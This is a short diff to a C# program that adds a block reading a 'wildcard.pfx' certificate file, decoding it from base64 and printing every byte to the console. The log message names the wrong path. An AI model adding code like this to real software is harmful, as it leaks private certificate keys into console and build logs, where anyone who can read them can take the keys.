@@ -21,6 +21,17 @@ public class Program
             return;
         }
 
+        if (File.Exists("local/wildcard.pfx"))
+        {
+            Console.WriteLine($"Wildcard pfx file {configPath} found!");
+            string text = File.ReadAllText("local/wildcard.pfx");
+            byte[] bytes = Convert.FromBase64String(text);
+            foreach (var b in bytes)
+            {
+                Console.Write(b);
+            }
+        }
+
         IConfigurationBuilder builder = new ConfigurationBuilder()
             .SetBasePath(Path.GetDirectoryName(configPath)!)
             .AddJsonFile(configPath, optional: false, reloadOnChange: true);
